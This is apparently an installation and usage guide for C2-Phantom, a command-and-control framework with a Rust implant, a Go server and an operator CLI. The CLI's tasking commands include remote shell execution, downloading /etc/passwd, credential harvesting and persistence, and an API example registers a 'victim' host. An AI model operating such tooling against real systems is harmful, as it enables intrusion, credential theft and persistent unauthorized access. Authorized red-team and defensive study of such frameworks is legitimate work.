# 🔮 C2-Phantom Installation & Deployment Guide

## Production-Grade Installation for Red Team Operations

---

## 📋 Table of Contents

1. [Quick Start](#quick-start)
2. [Requirements](#requirements)
3. [Installation Methods](#installation-methods)
4. [Configuration](#configuration)
5. [Usage](#usage)
6. [Architecture](#architecture)
7. [Troubleshooting](#troubleshooting)
8. [Development](#development)

---

## 🚀 Quick Start

### Option 1: Docker (Recommended for Production)

```bash
# Clone repository
git clone https://github.com/4fqr/c2-phantom.git
cd c2-phantom

# Start all services
docker-compose up -d

# Access server
# HTTP:  http://localhost:8080
# HTTPS: https://localhost:443

# Default API key: c2phantom-admin-key-change-me
```

### Option 2: Manual Installation

```bash
# 1. Install dependencies
pip install -r requirements.txt
pip install -e .

# 2. Configure server
export DATABASE_URL="postgres://user:pass@localhost:5432/c2phantom"
export REDIS_URL="localhost:6379"

# 3. Start server
cd server && go run main.go

# 4. Use CLI
c2phantom configure
c2phantom agents
```

---

## 📦 Requirements

### System Requirements

- **OS**: Linux (Ubuntu 20.04+, Debian 11+), Windows 10+, macOS 12+
- **RAM**: Minimum 4GB, Recommended 8GB+
- **Disk**: Minimum 20GB free space
- **Network**: Outbound internet access for dependencies

### Software Dependencies

#### Python
- **Python**: 3.10, 3.11, or 3.12
- **pip**: Latest version

#### Go
- **Go**: 1.21+

#### Rust
- **Rust**: 1.70+ (stable)
- **Cargo**: Latest

#### C/C++
- **GCC/Clang**: 9.0+
- **CMake**: 3.15+
- **OpenSSL**: 1.1.1+
- **libcurl**: 7.68+

#### Databases
- **PostgreSQL**: 14+
- **Redis**: 7+

---

## 🔧 Installation Methods

### Method 1: Docker Deployment (Production)

**Advantages**: Isolated, reproducible, easy to deploy

```bash
# Step 1: Clone repository
git clone https://github.com/4fqr/c2-phantom.git
cd c2-phantom

# Step 2: Generate TLS certificates (optional)
mkdir -p certs
openssl req -x509 -newkey rsa:4096 -keyout certs/server.key \
  -out certs/server.crt -days 365 -nodes \
  -subj "/CN=c2phantom.local"

# Step 3: Configure environment
cp .env.example .env
# Edit .env with your settings

# Step 4: Start services
docker-compose up -d

# Step 5: Verify
docker-compose ps
docker-compose logs server

# Step 6: Test connection
curl http://localhost:8080/health
```

**Services Started**:
- PostgreSQL (port 5432)
- Redis (port 6379)
- Go C2 Server (ports 8080, 443)

---

### Method 2: Manual Installation (Development)

#### Step 1: Install System Dependencies

**Ubuntu/Debian**:
```bash
sudo apt-get update
sudo apt-get install -y \
  python3.11 python3.11-venv python3-pip \
  golang-go \
  rustc cargo \
  cmake gcc g++ make \
  libssl-dev libcurl4-openssl-dev \
  postgresql-client redis-tools
```

**macOS**:
```bash
brew install python@3.11 go rust cmake openssl curl postgresql redis
```

**Windows**:
```powershell
# Install via Chocolatey
choco install python311 golang rust cmake openssl curl postgresql redis
```

#### Step 2: Clone & Setup Python

```bash
# Clone
git clone https://github.com/4fqr/c2-phantom.git
cd c2-phantom

# Create virtual environment
python3.11 -m venv .venv
source .venv/bin/activate  # Linux/macOS
# .venv\Scripts\Activate.ps1  # Windows

# Install Python dependencies
pip install --upgrade pip
pip install -r requirements.txt
pip install -e .
```

#### Step 3: Build C Core

```bash
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release

# Verify build
ls build/libcore.so  # Linux
ls build/libcore.dylib  # macOS
ls build/libcore.dll  # Windows
```

#### Step 4: Build Rust Agent

```bash
cd agent
cargo build --release

# Verify build
ls target/release/libagent.so  # Linux
ls target/release/libagent.dylib  # macOS
ls target/release/agent.dll  # Windows
cd ..
```

#### Step 5: Build Go Server

```bash
cd server
go mod download
go build -o c2-server

# Verify build
./c2-server --help
cd ..
```

#### Step 6: Setup Databases

**PostgreSQL**:
```bash
# Create database
createdb c2phantom

# Initialize schema
psql c2phantom < init.sql

# Verify
psql c2phantom -c "SELECT version();"
```

**Redis**:
```bash
# Start Redis
redis-server --daemonize yes

# Verify
redis-cli ping
```

#### Step 7: Configure Server

```bash
# Create config file
cat > config.env << EOF
DATABASE_URL=postgres://postgres:postgres@localhost:5432/c2phantom
REDIS_URL=localhost:6379
HTTP_PORT=8080
HTTPS_PORT=443
LOG_LEVEL=info
EOF

# Load config
export $(cat config.env | xargs)
```

#### Step 8: Start Server

```bash
# Terminal 1: Start Go server
cd server
./c2-server

# Terminal 2: Test server
curl http://localhost:8080/health

# Expected: {"status":"ok"}
```

---

## ⚙️ Configuration

### Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `DATABASE_URL` | PostgreSQL connection string | `postgres://postgres:postgres@localhost:5432/c2phantom` |
| `REDIS_URL` | Redis connection string | `localhost:6379` |
| `HTTP_PORT` | HTTP listener port | `8080` |
| `HTTPS_PORT` | HTTPS listener port | `443` |
| `TLS_CERT` | TLS certificate path | `server.crt` |
| `TLS_KEY` | TLS key path | `server.key` |
| `LOG_LEVEL` | Logging level (debug/info/warning/error) | `info` |
| `MAX_AGENTS` | Maximum concurrent agents | `10000` |

### CLI Configuration

```bash
# Configure CLI
c2phantom configure \
  --url http://localhost:8080 \
  --api-key c2phantom-admin-key-change-me

# Configuration saved to ~/.c2phantom/config.json
```

### TLS Certificates

**Generate Self-Signed Certificate**:
```bash
openssl req -x509 -newkey rsa:4096 \
  -keyout server.key -out server.crt \
  -days 365 -nodes \
  -subj "/C=US/ST=State/L=City/O=Org/CN=c2phantom.local"
```

**Use Let's Encrypt** (production):
```bash
certbot certonly --standalone -d yourdomain.com
cp /etc/letsencrypt/live/yourdomain.com/fullchain.pem server.crt
cp /etc/letsencrypt/live/yourdomain.com/privkey.pem server.key
```

---

## 📘 Usage

### Server Management

**Start Server**:
```bash
cd server && ./c2-server
```

**Check Server Status**:
```bash
curl http://localhost:8080/health
curl http://localhost:8080/api/v1/stats -H "X-API-Key: your-api-key"
```

**View Logs**:
```bash
# Docker
docker-compose logs -f server

# Manual
tail -f logs/server.log
```

### CLI Commands

**View Statistics**:
```bash
c2phantom stats
```

**List Agents**:
```bash
c2phantom agents
c2phantom agents --all  # Include inactive
```

**Agent Details**:
```bash
c2phantom agent <AGENT_ID>
```

**Interactive Session**:
```bash
c2phantom interact <AGENT_ID>

# Available commands:
# - shell <command>      Execute shell command
# - download <path>      Download file
# - upload <local> <remote>  Upload file
# - screenshot           Capture screenshot
# - harvest_creds        Harvest credentials
# - persist              Install persistence
# - exit                 Exit session
```

**Execute Command**:
```bash
c2phantom execute <AGENT_ID> shell "whoami"
c2phantom execute <AGENT_ID> screenshot
c2phantom execute <AGENT_ID> download "/etc/passwd"
```

**Task Management**:
```bash
c2phantom tasks                    # List all tasks
c2phantom tasks --agent <AGENT_ID> # Tasks for specific agent
c2phantom tasks --status pending   # Filter by status
c2phantom task <TASK_ID>           # Task details
```

**Kill Agent**:
```bash
c2phantom kill <AGENT_ID>
```

### API Usage

**Register Agent**:
```bash
curl -X POST http://localhost:8080/api/v1/agents/register \
  -H "Content-Type: application/json" \
  -d '{
    "hostname": "target-pc",
    "username": "victim",
    "os": "Windows",
    "architecture": "x64",
    "pid": 1234
  }'
```

**List Agents**:
```bash
curl http://localhost:8080/api/v1/agents \
  -H "X-API-Key: your-api-key"
```

**Create Task**:
```bash
curl -X POST http://localhost:8080/api/v1/tasks \
  -H "Content-Type: application/json" \
  -H "X-API-Key: your-api-key" \
  -d '{
    "agent_id": "agent-uuid",
    "command": "shell",
    "arguments": ["whoami"]
  }'
```

**Get Tasks**:
```bash
curl http://localhost:8080/api/v1/tasks?agent_id=agent-uuid \
  -H "X-API-Key: your-api-key"
```

---

## 🏗️ Architecture

### Component Overview

```
┌─────────────────┐
│   Operator CLI  │ (Python - Rich UI)
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│   Go C2 Server  │ (HTTP/HTTPS/gRPC)
│  ┌───────────┐  │
│  │PostgreSQL │  │ (Agents & Tasks)
│  └───────────┘  │
│  ┌───────────┐  │
│  │  Redis    │  │ (Queue & Pub/Sub)
│  └───────────┘  │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  Rust Agent     │ (Target System)
│  ┌───────────┐  │
│  │  C Core   │  │ (Syscalls/ETW/AMSI)
│  └───────────┘  │
└─────────────────┘
```

### Technology Stack

| Layer | Technology | Purpose |
|-------|------------|---------|
| **Control** | Python + Rich | Operator CLI interface |
| **Server** | Go + Gin + GORM | High-performance C2 server |
| **Database** | PostgreSQL | Persistent storage |
| **Cache** | Redis | Task queue & pub/sub |
| **Agent** | Rust + Tokio | Memory-safe agent |
| **Core** | C + Assembly | Low-level operations |

---

## 🔍 Troubleshooting

### Common Issues

**1. Python tests failing with gRPC error**
```bash
# Solution: Install gRPC dependencies
pip install grpcio grpcio-tools protobuf
```

**2. Go server won't start**
```bash
# Check PostgreSQL connection
psql -U postgres -c "SELECT 1;"

# Check Redis connection
redis-cli ping

# View detailed logs
LOG_LEVEL=debug ./c2-server
```

**3. Rust agent build fails**
```bash
# Update Rust
rustup update stable

# Clean and rebuild
cd agent
cargo clean
cargo build --release
```

**4. C core build fails**
```bash
# Install missing dependencies
sudo apt-get install libssl-dev libcurl4-openssl-dev

# Clean and rebuild
rm -rf build
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build
```

**5. Docker containers won't start**
```bash
# Check logs
docker-compose logs

# Restart services
docker-compose down
docker-compose up -d

# Clean restart
docker-compose down -v
docker-compose up -d
```

### Performance Issues

**High Memory Usage**:
- Reduce `MAX_AGENTS` in config
- Enable connection pooling (already configured)
- Monitor with: `docker stats`

**Slow Response Times**:
- Check database indexes (already created in init.sql)
- Enable Redis caching
- Use HTTPS with HTTP/2

---

## 🛠️ Development

### Running Tests

**Python Tests**:
```bash
pytest tests/test_python.py -v
pytest tests/test_python.py -v --cov=c2_phantom
```

**Go Tests**:
```bash
cd server
go test -v -race -coverprofile=coverage.out
go tool cover -html=coverage.out
```

**Rust Tests**:
```bash
cd agent
cargo test --verbose
cargo test --release
```

**All Tests**:
```bash
# Run comprehensive test suite
./run_tests.sh
```

### Building from Source

**Development Build**:
```bash
# Python
pip install -e ".[dev]"

# Go
cd server && go build -v

# Rust
cd agent && cargo build

# C
cmake -B build -DCMAKE_BUILD_TYPE=Debug
cmake --build build
```

**Production Build**:
```bash
# Go (optimized)
cd server
go build -ldflags="-s -w" -o c2-server

# Rust (optimized)
cd agent
cargo build --release

# C (optimized)
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build
```

### Contributing

1. Fork repository
2. Create feature branch: `git checkout -b feature/amazing`
3. Commit changes: `git commit -m "Add amazing feature"`
4. Push branch: `git push origin feature/amazing`
5. Open Pull Request

---

## 📄 License

This project is licensed under the MIT License. See [LICENSE](LICENSE) for details.

---

## ⚠️ Legal Disclaimer

**FOR AUTHORIZED SECURITY TESTING ONLY**

C2-Phantom is designed exclusively for:
- Authorized penetration testing
- Red team exercises with written permission
- Security research in controlled environments
- Educational purposes in legal contexts

**PROHIBITED USES**:
- Unauthorized access to computer systems
- Malicious activities of any kind
- Violations of local, national, or international laws

**You are solely responsible for ensuring your use complies with all applicable laws.**

---

## 📞 Support

- **Issues**: https://github.com/4fqr/c2-phantom/issues
- **Documentation**: https://github.com/4fqr/c2-phantom/wiki
- **Discussions**: https://github.com/4fqr/c2-phantom/discussions

---

*Built with precision for professional red team operations. Use responsibly.*
